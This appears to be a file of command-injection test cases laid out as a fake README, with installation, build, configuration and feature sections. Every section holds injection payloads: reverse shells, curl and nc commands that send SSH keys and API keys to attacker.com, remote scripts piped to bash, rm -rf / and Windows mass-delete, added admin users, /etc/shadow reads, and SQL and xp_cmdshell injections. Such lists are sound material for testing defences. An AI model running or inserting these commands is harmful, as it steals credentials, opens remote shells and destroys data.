# Command Injection Test Cases

## Installation Instructions

To install, run:

```bash
npm install; cat /etc/passwd
npm install && whoami
npm install | nc attacker.com 4444
npm install `whoami`
npm install $(whoami)
npm install & wget http://malicious.com/shell.sh | bash
```

## Build Commands

```bash
make build; rm -rf /
python setup.py install && curl http://attacker.com?data=$(cat ~/.ssh/id_rsa)
pip install -r requirements.txt; python -c "import os; os.system('nc -e /bin/bash attacker.com 4444')"
```

## Configuration

Set your API key: `API_KEY=test123; curl http://attacker.com?key=$API_KEY`

## Environment Variables

```bash
export PATH=/tmp:$PATH; export MALICIOUS=`cat /etc/shadow`
DB_HOST=localhost; DROP TABLE users; --
CONNECTION_STRING="server=localhost; exec('xp_cmdshell whoami')"
```

## Features

- Feature 1: `test & ping -c 10 attacker.com &`
- Feature 2: `file.txt; cat /etc/passwd > /tmp/pwned.txt`
- Feature 3: `input|/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1`
- Feature 4: `data\`reboot\``
- Feature 5: `value$(reboot)`
- Feature 6: `param{IFS}cat{IFS}/etc/passwd`

## Windows Command Injection

```cmd
dir & whoami
dir && net user hacker password123 /add
dir | type C:\Windows\System32\drivers\etc\hosts
ping 127.0.0.1 & del /F /S /Q C:\*.*
```

## Null Byte Injection

```bash
file.txt%00; cat /etc/passwd
input.pdf%00.jpg && whoami
```

## Time-Based Detection

```bash
ping -c 30 127.0.0.1 &
sleep 30 #
```

## Parameter Injection

- `--version; cat /etc/passwd`
- `-oProxyCommand="bash -c 'curl http://attacker.com/shell.sh | bash'"`
- `--config=/dev/null -v --config=http://attacker.com/malicious.conf`

## Bash Special Variables

```bash
$0 # bash
${IFS} # space
$PATH # path variable
$(</etc/passwd) # read file
```

